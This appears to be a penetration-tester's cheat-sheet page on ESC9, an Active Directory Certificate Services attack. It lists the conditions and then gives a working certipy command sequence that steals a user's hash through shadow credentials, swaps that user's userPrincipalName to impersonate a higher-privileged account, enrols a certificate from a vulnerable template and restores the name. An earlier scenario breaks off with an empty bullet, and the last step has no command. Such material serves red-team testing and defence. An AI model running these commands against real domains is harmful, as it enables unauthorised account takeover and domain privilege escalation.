# ESC9 - No security extension

If the certificate attribute `msPKI-Enrollment-Flag` contains the flag `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` extension will not be embedded, meaning that even with `StrongCertificateBindingEnforcement` set to `1`, the mapping will be performed similarly as a value of `0` in the registry key.

An account "raph@domain.local" has `GenericWrite` permissions over "hugo@domain.local", with the goal to compromise the account administrator@domain.local. 
- Firstly, the Raph's privilege over hugo allows its hash retrievement (using Shadow Credentials).
- Hugo's userPrincipalName (UPN) is then modified to Administrator, purposely omitting the @domain.local domain part
- 





## Requirements
-----------------------------

*   `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag (`0x4`)
*   The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
*   The template specifies client authentication
*   `GenericWrite` right against any account A to compromise any account B

### Exploit
-------

Scenario : 

*   **user1** ==(GenericWrite)=> **user2** ==(want to compromise)=> **user3**
*   **user2** is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value. 

1/ Obtain **user2**'s hash (shadow credentials for ex.) :

```text-plain
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

2/  Change the **user2**'s `userPrincipalName` to **user3**.

```text-plain
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

3/ Ask for the vulnerable certificate

```text-plain
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

4/ Reverse the user2's UPN :

```text-plain
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

5/ Auth with the certif as User3


### More information 
https://www.thehacker.recipes/a-d/movement/ad-cs/certificate-templates#certificate-mapping
